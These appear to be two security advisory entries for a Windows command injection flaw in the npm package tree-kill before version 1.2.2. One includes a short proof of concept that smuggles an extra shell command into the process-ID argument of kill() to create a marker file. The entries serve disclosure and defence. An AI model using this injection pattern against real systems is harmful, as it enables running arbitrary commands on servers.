  title: Command Injection
  description: Versions of `tree-kill` prior to 1.2.2 are vulnerable to Command Injection.
    The package fails to sanitize values passed to the  `kill` function. If this value
    is user-controlled it  may allow attackers to run arbitrary commands in the server.
    The issue only affects Windows systems.

  title: Command Injection
  description: |
    [tree-kill][1] is a package to kill all processes in the process tree,
    including the root process.

    Affected versions of this package are vulnerable to Command Injection.
    User input is concatenated with a `command` within `tree-kill` and
    `treekill` that will be executed without any check.

    Note: This vulnerability is only applicable if the package is used on a
    Windows operating system.

    ### PoC by mik317   {#poc-by-mik317}

    1) Create this POC file

        //poc.js
        var kill = require('tree-kill');
        kill('3333332 & echo "HACKED" > HACKED.txt & ');

    2) Execute the following commands in another terminal:

        npm i tree-kill # Install affected module
        dir # Check *HACKED.txt* doesn't exist
        node poc.js #  Run the PoC
        dir # Now *HACKED.txt* exists :)

    3) A new file called `HACKED.txt` will be created, containing the
    `HACKED` string
